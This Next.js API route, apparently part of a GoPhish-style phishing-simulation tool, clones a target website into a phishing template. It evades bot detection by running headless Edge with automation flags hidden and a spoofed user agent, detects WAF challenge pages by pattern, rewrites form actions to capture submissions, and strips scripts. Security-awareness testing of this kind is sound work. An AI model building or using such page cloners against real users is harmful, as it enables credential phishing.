import { NextResponse } from "next/server";
import { readSessionCookie, verifySession } from "@/lib/session";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import fs from "node:fs";

const execFileAsync = promisify(execFile);

function getEdgePath(): string | null {
  const paths = [
    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
  ];
  for (const p of paths) {
    if (fs.existsSync(p)) return p;
  }
  return null;
}

function checkWafBlock(html: string): string | null {
  if (!html) return null;
  const lower = html.toLowerCase();
  if (
    lower.includes("_incapsula_resource") ||
    lower.includes("incapsula incident id") ||
    lower.includes("request unsuccessful. incapsula") ||
    lower.includes("incap_ses")
  ) {
    return "Imperva Incapsula WAF";
  }
  if (
    lower.includes("cf-browser-verification") ||
    lower.includes("just a moment...") ||
    lower.includes("attention required! | cloudflare") ||
    (lower.includes("cloudflare") && lower.includes("ray id:"))
  ) {
    return "Cloudflare Bot Protection";
  }
  if (lower.includes("datadome") || lower.includes("perimeterx")) {
    return "Anti-Bot Protection";
  }
  return null;
}

async function renderWithHeadlessBrowser(url: string): Promise<string | null> {
  const edge = getEdgePath();
  if (!edge) return null;
  try {
    const { stdout } = await execFileAsync(
      edge,
      [
        "--headless=new",
        "--disable-gpu",
        "--dump-dom",
        "--disable-blink-features=AutomationControlled",
        "--window-size=1920,1080",
        "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        url,
      ],
      { maxBuffer: 15 * 1024 * 1024, timeout: 20000 }
    );
    if (stdout && stdout.length > 500) {
      return stdout;
    }
  } catch (e) {
    console.warn("Headless browser render failed:", e);
  }
  return null;
}

export async function POST(req: Request) {
  const token = readSessionCookie(req.headers.get("cookie"));
  if (!token || !verifySession(token)) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const body = await req.json().catch(() => null);
  const raw = typeof body?.url === "string" ? body.url.trim() : "";
  let parsed: URL;
  try {
    parsed = new URL(raw);
  } catch {
    return NextResponse.json({ error: "Enter a valid http(s) URL." }, { status: 400 });
  }
  if (parsed.protocol !== "http:" && parsed.protocol !== "https:")
    return NextResponse.json({ error: "Enter a valid http(s) URL." }, { status: 400 });

  let html = "";
  let needsHeadless = false;

  try {
    const res = await fetch(parsed.toString(), {
      signal: AbortSignal.timeout(10000),
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      },
    });

    if (res.ok) {
      html = await res.text();
      // Check if it's an empty client-rendered SPA or challenge page
      const wafName = checkWafBlock(html);
      const hasFormOrInput = /<form\b|<input\b/i.test(html);
      if (wafName || !hasFormOrInput || html.length < 2000) {
        needsHeadless = true;
      }
    } else {
      needsHeadless = true;
    }
  } catch {
    needsHeadless = true;
  }

  // If initial fetch is an SPA shell or failed/challenged, render full DOM via headless Edge
  if (needsHeadless || !html.trim()) {
    const rendered = await renderWithHeadlessBrowser(parsed.toString());
    if (rendered && rendered.trim()) {
      html = rendered;
    }
  }

  // Check if target is explicitly blocked by WAF/Anti-Bot challenge
  const detectedWaf = checkWafBlock(html);
  if (detectedWaf) {
    return NextResponse.json(
      {
        error: `Website (${parsed.hostname}) dilindungi oleh sistem Anti-Bot / WAF (${detectedWaf}). Server otomatis diblokir saat mencoba mengambil source secara langsung. Solusi: Buka ${parsed.href} di browser Anda, tekan Ctrl+U (View Page Source), Copy kodenya, lalu Paste langsung ke tab "Source HTML".`,
      },
      { status: 422 }
    );
  }

  if (!html.trim()) {
    return NextResponse.json({ error: "Gagal meng-clone website dari URL yang dimasukkan." }, { status: 400 });
  }

  // 1. Inject <base href="..."> into <head> so all relative CSS, images, and fonts load properly
  if (!/<base\s/i.test(html)) {
    const baseTag = `<base href="${parsed.origin}/">`;
    if (/<head[^>]*>/i.test(html)) {
      html = html.replace(/<head[^>]*>/i, (match) => `${match}\n  ${baseTag}`);
    } else {
      html = `${baseTag}\n${html}`;
    }
  }

  // 2. Rewrite form actions to empty string "" (GoPhish standard behavior)
  html = html.replace(/<form\b([^>]*?)action=["'][^"']*["']/gi, '<form$1action=""');

  // 3. Strip client-side SPA scripts and hydration bundles (Next.js/React/Vue/Webpack)
  // These scripts cause "Terjadi kesalahan pada sisi client" hydration crashes, anti-iframe busting,
  // and interfere with native form submission in phishing templates.
  html = html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gis, "");
  html = html.replace(/<noscript\b[^<]*(?:(?!<\/noscript>)<[^<]*)*<\/noscript>/gis, "");

  return NextResponse.json({
    html,
    redirectUrl: parsed.href,
  });
}
